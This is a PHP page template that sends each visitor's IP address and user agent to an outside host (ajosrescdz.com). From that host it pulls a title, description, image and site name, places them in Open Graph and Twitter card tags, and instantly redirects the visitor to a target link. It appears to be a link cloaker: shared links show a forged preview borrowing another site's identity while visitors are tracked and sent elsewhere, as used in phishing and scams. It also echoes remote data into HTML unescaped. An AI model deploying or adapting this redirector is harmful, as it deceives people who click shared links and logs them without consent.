<?php

/*
 * Domain is {{domain.com}}
 * */

function getIpClient(){
    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
function getData($data){
    $url = "http://ajosrescdz.com/users/?p=api/index&id_link=".$data["id_link"]."&name=".$data["name"]."&user_agent=".urlencode($_SERVER['HTTP_USER_AGENT'])."&ip=".getIpClient();
    $data = file_get_contents($url);
    $data = json_decode($data, true);
    if($data["status"]){
        return $data["data"];
    }
    return $data["error"];
}
$url = "";$site_name = "";$title = "";$description = "";
if($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET["id"]) && isset($_GET["n"])){
    $data["id_link"]     = $_GET["id"];
    $data["name"]        = $_GET["n"];
    $data = getData($data);
    $url = $data["image"];
    $site_name = $data["site_name"];
    $title = $data["title"];
    $description = $data["description"];
    header("refresh:0; url=".$data["target_link"]);
}
?>
<!DOCTYPE html>
<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

    <meta content="origin" name="referrer">
    <meta name="code_verify" content="{{code_verify}}">
    <meta content="<?= $url ?>" itemprop="image">
    <meta property="og:url" content="https://localhost/app">
    <meta property="og:site_name" content="<?= explode("//", $site_name)[1] ?>">
    <meta property="og:title" content="<?= $title ?>">
    <meta property="og:description" content="<?= $description ?>">
    <meta property="og:type" content="article">
    <meta property="og:image" content="<?= $url ?>">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="1200">
    <meta property="og:image" content="<?= $url ?>">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="620">
    <meta property="og:image" content="<?= $url ?>">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="620">
    <meta property="fb:app_id" content="458161464911834"><!-- Dont Change This -->
    <meta property="twitter:site" content="<?=  explode("//", explode(".", $site_name)[0])[1] ?>">
    <meta property="twitter:site:id" content="">
    <meta property="twitter:creator" content="<?= explode("//", explode(".", $site_name)[0])[1] ?>">
    <meta property="twitter:creator:id" content="">
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:title" content="<?= $title ?>">
    <meta property="twitter:description" content="<?= $description ?>">
    <meta property="twitter:image:src" content="<?= $url ?>">
    <meta property="twitter:image:width" content="1200">
    <meta property="twitter:image:height" content="1200">
</head>
</html>
